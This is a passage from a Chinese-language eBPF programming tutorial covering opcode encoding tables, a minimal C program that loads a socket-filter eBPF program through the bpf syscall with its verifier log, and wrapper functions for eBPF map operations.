<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JLE</th><th>0xB0</th><th>PC += off if dst &lt;= src</th><th>仅 eBPF：无符号 ‘&lt;=’</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JSLT</th><th>0xC0</th><th>PC += off if dst &lt; src</th><th>仅 eBPF：有符号 ‘&lt;’</th></tr>
<tr><th>BPF_JMP / BPF_JMP64</th><th>BPF_JSLE</th><th>0xD0</th><th>PC += off if dst &lt;= src</th><th>仅 eBPF：有符号 ‘&lt;=’</th></tr>
<tr><th>opcode中间一个bit表示源 含义如下表</th><th></th><th></th><th></th><th></th></tr>
</tbody></table>
<table><thead><tr><th>指令类型</th><th>源</th><th>值</th><th>描述</th></tr></thead><tbody>
<tr><th>BPF_ALU / BPF_ALU64 / BPF_JMP / BPF_JMP64</th><th>BPF_K</th><th>0x00</th><th>使用32-bit <code>imm32</code> 作为源操作数</th></tr>
<tr><th>BPF_ALU / BPF_ALU64 / BPF_JMP / BPF_JMP64</th><th>BPF_X</th><th>0x08</th><th>使用源寄存器 （<code>src_reg</code>） 作为源操作数</th></tr>
</tbody></table>
<p>对于 <code>BPF_END</code> 操作码而言含义如下：</p>
<table><thead><tr><th>指令类型</th><th>操作代码</th><th>源</th><th>值</th><th>描述</th></tr></thead><tbody>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_END</th><th>BPF_TO_LE</th><th>0x00</th><th>转为小端序</th></tr>
<tr><th>BPF_ALU / BPF_ALU64</th><th>BPF_END</th><th>BPF_TO_BE</th><th>0x08</th><th>转为大端序</th></tr>
</tbody></table>
<p>对于Load &amp; Store 指令分如下三部分</p>
<table><thead><tr><th>3 bits</th><th>2 bit</th><th>3 bits</th></tr></thead><tbody>
<tr><th>mode（模式）</th><th>size（大小）</th><th>instruction class （指令类型）</th></tr>
<tr><th>load &amp; store指令size域表示操作的字节数</th><th></th><th></th></tr>
</tbody></table>
<table><thead><tr><th>大小</th><th>值</th><th>描述</th></tr></thead><tbody>
<tr><th>BPF_W</th><th>0x00</th><th>单字（4 字节）</th></tr>
<tr><th>BPF_H</th><th>0x08</th><th>半字（2字节）</th></tr>
<tr><th>BPF_B</th><th>0x10</th><th>单字节（1字节）</th></tr>
<tr><th>BPF_DW</th><th>0x18</th><th>双字（8字节）</th></tr>
<tr><th>mode域 表示操作的模式 即如何操作制定大小的数据</th><th></th><th></th></tr>
</tbody></table>
<table><thead><tr><th>模式</th><th>值</th><th>描述</th><th>备注</th></tr></thead><tbody>
<tr><th>BPF_IMM</th><th>0x00</th><th>64 位立即数</th><th>eBPF 为64 位立即数，cBPF 中为 32 位</th></tr>
<tr><th>BPF_ABS</th><th>0x20</th><th>数据包直接访问</th><th>兼容自 cBPF 指令。R6 作为隐式输入，存放 <code>struct *sk_buff</code> ；R0 作为隐式输出，存放包中读出数据；R1 ~ R5 作为 scratch registers，在每次调用后会被清空</th></tr>
<tr><th>BPF_IND</th><th>0x40</th><th>数据包间接访问</th><th>同 BPF_ABS</th></tr>
<tr><th>BPF_MEM</th><th>0x60</th><th>赋值给 *(size *)(dst_reg + off)</th><th>标准 load &amp; store 操作</th></tr>
<tr><th>BPF_LEN</th><th>0x80</th><th>保留指令</th><th>仅用于 cBPF</th></tr>
<tr><th>BPF_MSH</th><th>0xA0</th><th>保留指令</th><th>仅用于 cBPF</th></tr>
<tr><th>BPF_XADD</th><th>0xC0</th><th>原子操作，*(无符号类型 *)(dst_reg + off16) 运算= src_reg</th><th>仅用于 eBPF，不支持 1 / 2 字节操作</th></tr>
<tr><th>对于 <code>BPF_XADD</code>， <code>imm32</code> 域被用来表示原子操作的运算类型：</th><th></th><th></th><th></th></tr>
</tbody></table>
<table><thead><tr><th>imm32</th><th>值</th><th>描述</th></tr></thead><tbody>
<tr><th>BPF_ADD</th><th>0x00</th><th>原子加</th></tr>
<tr><th>BPF_OR</th><th>0x40</th><th>原子或</th></tr>
<tr><th>BPF_AND</th><th>0x50</th><th>原子与</th></tr>
<tr><th>BPF_XOR</th><th>0xa0</th><th>原子异或</th></tr>
</tbody></table>
<h3 id="raw-ebpf-cheng-xu-bian-xie">raw eBPF 程序编写</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdint.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/bpf.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Error at: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, msg);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">CODE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">SRC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">)          \
</span><span style="color:#c0c5ce;">    ((</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn) {                                \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">code        </span><span style="color:#c0c5ce;">= CODE,                            \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">dst_reg     </span><span style="color:#c0c5ce;">= DST,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">src_reg     </span><span style="color:#c0c5ce;">= SRC,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">off         </span><span style="color:#c0c5ce;">= OFF,                             \
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">imm         </span><span style="color:#c0c5ce;">= IMM                              \
</span><span style="color:#c0c5ce;">})
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn test_bpf_prog[] = {
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x114514</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | BPF_EXIT, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">TEST_BPF_LOG_SZ </span><span style="color:#d08770;">0x10000
</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> test_bpf_log_buf[TEST_BPF_LOG_SZ] = { &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39; };
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr test_bpf_attr = {
</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">prog_type </span><span style="color:#c0c5ce;">= BPF_PROG_TYPE_SOCKET_FILTER,
</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">insns </span><span style="color:#c0c5ce;">= (uint64_t) &amp;test_bpf_prog,
</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">insn_cnt </span><span style="color:#c0c5ce;">= sizeof(test_bpf_prog) / sizeof(test_bpf_prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]),
</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">license </span><span style="color:#c0c5ce;">= (uint64_t) &quot;</span><span style="color:#a3be8c;">GPL</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">log_level </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">log_buf </span><span style="color:#c0c5ce;">= (uint64_t) test_bpf_log_buf,
</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">log_size </span><span style="color:#c0c5ce;">= TEST_BPF_LOG_SZ,
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static inline int </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_bpf, cmd, attr, sizeof(*attr));
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc </span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">envp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> test_bpf_prog_fd;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*err_msg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* load bpf prog into kernel */
</span><span style="color:#c0c5ce;">    test_bpf_prog_fd = </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_PROG_LOAD, &amp;test_bpf_attr);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(test_bpf_prog_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        err_msg = &quot;</span><span style="color:#a3be8c;">FAILED to load bpf program!</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_bpf_load;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* output the log */
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(test_bpf_log_buf);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(test_bpf_prog_fd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">err_bpf_load:
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(test_bpf_log_buf);
</span><span style="color:#c0c5ce;">err_socket:
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(err_msg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~/ebpf_learn$ sudo ./a
</span><span style="color:#c0c5ce;">func#0 @0
</span><span style="color:#c0c5ce;">0: R1=ctx() R10=fp0
</span><span style="color:#c0c5ce;">0: (b7) r0 = 1131796                  ; R0_w=0x114514
</span><span style="color:#c0c5ce;">1: (95) exit
</span><span style="color:#c0c5ce;">processed 2 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0
</span></pre>
<blockquote>
<p>示例程序只加载了程序 没有做触发
<code>BPF_PROG_TYPE_SOCKET_FILTER</code> 需要将其绑定到套接字 再通过网络数据包触发</p>
</blockquote>
<p>eg</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">test_bpf_prog_fd = </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_PROG_LOAD, &amp;test_bpf_attr);
</span><span style="color:#65737e;">// 在 main() 中增加：
</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sock_fd[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];
</span><span style="color:#8fa1b3;">socketpair</span><span style="color:#c0c5ce;">(AF_UNIX, SOCK_DGRAM, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sock_fd);
</span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], SOL_SOCKET, SO_ATTACH_BPF, &amp;test_bpf_prog_fd, sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">));
</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], &quot;</span><span style="color:#a3be8c;">trigger</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">);  </span><span style="color:#65737e;">// 触发 eBPF 程序
</span></pre>
<h3 id="raw-ebpf-mapshi-yong">raw eBPF map使用</h3><p>BPF_MAP_CREATE 创建eBPF map 返回一个文件描述符作为引用</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_create</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">map_type</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">key_size</span><span style="color:#c0c5ce;">, 
</span><span style="color:#c0c5ce;">               </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">value_size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">max_entries</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_type </span><span style="color:#c0c5ce;">= map_type,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key_size </span><span style="color:#c0c5ce;">= key_size,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value_size </span><span style="color:#c0c5ce;">= value_size,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">max_entries </span><span style="color:#c0c5ce;">= max_entries,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_CREATE, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>BPF_MAP_UPDATE 更新key-&gt;value映射
flags应该为：</p>
<ul>
<li>BPF_ANY 有则更新，无则新建</li>
<li>BPF_NOEXIST	仅在不存在时进行创建 若已有对应的 key 则返回<code>-EEXIST</code></li>
<li>BPF_EXIST 仅在存在时进行更新 若无对应的 key 则返回<code>-ENOENT</code></li>
</ul>
<p>创建映射时map中映射数量达到<code>max_entries</code>返回<code>E2BIG</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">,uint64_t </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">flags </span><span style="color:#c0c5ce;">= flags,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_UPDATE_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>BPF_MAP_LOOKUP_ELEM 查找map中是否存在对应key 有则将value拷贝到用户空间指定的value缓冲区</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_LOOKUP_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>BPF_MAP_GET_NEXT_KEY 遍历
查找传入的key 并返回该key的下一个key拷贝回用户空间
若不存在则返回0并拷贝map中第一个key到用户空间
若为最后一个key 则返回-1</p>
<p>遍历：先传一个不存在的 获得第一个key，最后不断调用 直到返回-1</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_get_next_key</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">next_key </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_GET_NEXT_KEY, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>BPF_MAP_DELETE_ELEM 删除已有映射 不存在返回<code>-EPERM</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_delete_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_DELETE_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>在内核的 eBPF map 数据结构中会保存引用了该 map 的程序数量，若该 map 不再被任一程序引用则会自动释放，不需要主动去销毁一个 eBPF map</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">net/if.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/if_packet.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/if_ether.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">arpa/inet.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/bpf.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_bpf, cmd, attr, sizeof(*attr));
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_create</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">map_type</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">key_size</span><span style="color:#c0c5ce;">, 
</span><span style="color:#c0c5ce;">               </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">value_size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">max_entries</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_type </span><span style="color:#c0c5ce;">= map_type,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key_size </span><span style="color:#c0c5ce;">= key_size,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value_size </span><span style="color:#c0c5ce;">= value_size,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">max_entries </span><span style="color:#c0c5ce;">= max_entries,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_CREATE, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
